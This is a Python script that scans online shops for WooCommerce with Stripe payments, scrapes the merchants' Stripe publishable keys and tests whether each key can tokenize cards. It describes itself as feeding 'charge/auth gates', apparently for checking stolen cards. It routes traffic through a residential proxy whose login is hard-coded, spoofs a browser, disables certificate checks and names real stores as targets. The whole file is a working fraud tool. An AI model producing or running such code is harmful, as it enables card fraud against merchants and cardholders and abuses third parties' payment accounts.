"""
WooStripe Site Scanner
Discovers WooCommerce sites with Stripe payment gateway
for use with woostripe charge/auth gates
"""

import requests
import re
import os
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

RESIDENTIAL_PROXY = os.environ.get('RESIDENTIAL_PROXY', 'http://user_pinta:1acNvmOToR6d-country-US-state-Colorado-city-Denver@residential.ip9.io:8000')

DEFAULT_PROXY = {
    'http': RESIDENTIAL_PROXY,
    'https': RESIDENTIAL_PROXY
}

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
}


def check_site(domain: str, proxy: dict = None) -> Dict:
    """
    Check a site for WooCommerce + Stripe integration.
    Returns dict with site info and capabilities.
    """
    if proxy is None:
        proxy = DEFAULT_PROXY
    
    result = {
        'domain': domain,
        'status': 'unknown',
        'has_woocommerce': False,
        'has_stripe': False,
        'has_wc_stripe': False,
        'stripe_pk': None,
        'has_wc_ajax': False,
        'checkout_accessible': False,
        'error': None
    }
    
    paths_to_check = ['/checkout/', '/cart/', '/my-account/add-payment-method/', '/']
    
    for path in paths_to_check:
        url = f'https://www.{domain}{path}'
        try:
            response = requests.get(url, headers=HEADERS, timeout=12, proxies=proxy, verify=False, allow_redirects=True)
            
            if response.status_code != 200:
                continue
            
            text = response.text
            
            woo_indicators = [
                'woocommerce' in text.lower(),
                'wc-ajax' in text.lower(),
                'wc_add_to_cart' in text.lower(),
                'wp-content/plugins/woocommerce' in text,
            ]
            result['has_woocommerce'] = any(woo_indicators)
            
            stripe_indicators = [
                'wc-stripe' in text.lower(),
                'woocommerce-gateway-stripe' in text.lower(),
                'stripe_payment_request' in text.lower(),
                'wc_stripe' in text.lower(),
            ]
            result['has_wc_stripe'] = any(stripe_indicators)
            
            if 'stripe' in text.lower():
                result['has_stripe'] = True
            
            pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]{20,}', text)
            if pk_match:
                result['stripe_pk'] = pk_match.group(0)
            
            if '?wc-ajax=' in text or 'wc-ajax' in text:
                result['has_wc_ajax'] = True
            
            if path == '/checkout/' and response.status_code == 200:
                result['checkout_accessible'] = True
            
            if result['has_woocommerce'] and (result['has_wc_stripe'] or result['stripe_pk']):
                result['status'] = 'woostripe'
                break
            elif result['has_woocommerce']:
                result['status'] = 'woocommerce_only'
            
        except requests.exceptions.Timeout:
            result['error'] = 'timeout'
        except requests.exceptions.ProxyError:
            result['error'] = 'proxy_error'
        except Exception as e:
            result['error'] = str(e)[:50]
    
    if result['status'] == 'unknown' and result['has_woocommerce']:
        result['status'] = 'woocommerce_only'
    elif result['status'] == 'unknown' and result['has_stripe']:
        result['status'] = 'stripe_only'
    elif result['status'] == 'unknown':
        result['status'] = 'no_match'
    
    return result


def scan_sites(domains: List[str], max_workers: int = 5, proxy: dict = None) -> List[Dict]:
    """
    Scan multiple sites concurrently.
    Returns list of site info dicts.
    """
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_domain = {executor.submit(check_site, domain, proxy): domain for domain in domains}
        
        for future in as_completed(future_to_domain):
            result = future.result()
            results.append(result)
            
            status_emoji = {
                'woostripe': '>>>',
                'woocommerce_only': 'WOO',
                'stripe_only': 'STRIPE',
                'no_match': '--',
                'unknown': '?'
            }.get(result['status'], '?')
            
            pk_info = f" PK:{result['stripe_pk'][:30]}..." if result['stripe_pk'] else ""
            print(f"{status_emoji} {result['domain']}{pk_info}")
    
    return results


def test_stripe_pk(pk: str, proxy: dict = None) -> Tuple[bool, str]:
    """
    Test if a Stripe PK allows third-party tokenization.
    Returns (works, message)
    """
    if proxy is None:
        proxy = DEFAULT_PROXY
    
    headers = {
        'Authorization': f'Bearer {pk}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'type': 'card',
        'card[number]': '4000000000000002',
        'card[exp_month]': '12',
        'card[exp_year]': '26',
        'card[cvc]': '123',
    }
    
    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers=headers, data=data, proxies=proxy, timeout=20)
        
        if response.status_code == 200:
            pm_id = response.json().get('id', '')
            return True, f"SUCCESS: {pm_id}"
        else:
            error = response.json().get('error', {})
            message = error.get('message', 'Unknown error')[:60]
            code = error.get('code', '')
            
            if 'integration surface' in message.lower():
                return False, "BLOCKED: Integration surface restriction"
            
            return False, f"{code}: {message}"
    
    except Exception as e:
        return False, f"ERROR: {str(e)[:40]}"


def find_woostripe_sites(domains: List[str], test_pks: bool = True) -> List[Dict]:
    """
    Find WooStripe sites and optionally test their PKs.
    Returns list of viable sites.
    """
    print(f"Scanning {len(domains)} sites for WooStripe...\n")
    
    results = scan_sites(domains)
    
    woostripe_sites = [r for r in results if r['status'] == 'woostripe']
    
    print(f"\n=== Found {len(woostripe_sites)} WooStripe sites ===")
    
    if test_pks:
        print("\nTesting Stripe PKs...")
        for site in woostripe_sites:
            if site['stripe_pk']:
                works, message = test_stripe_pk(site['stripe_pk'])
                site['pk_works'] = works
                site['pk_message'] = message
                status = "OK" if works else "BLOCKED"
                print(f"  {site['domain']}: {status} - {message[:50]}")
    
    return woostripe_sites


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    
    test_domains = [
        'example-store.com',
        'wolfandbadger.com',
        'lovecrafts.com',
    ]
    
    results = find_woostripe_sites(test_domains, test_pks=True)
    
    print("\n=== Viable Sites ===")
    for site in results:
        if site.get('pk_works', False):
            print(f"  {site['domain']}: {site['stripe_pk'][:40]}...")
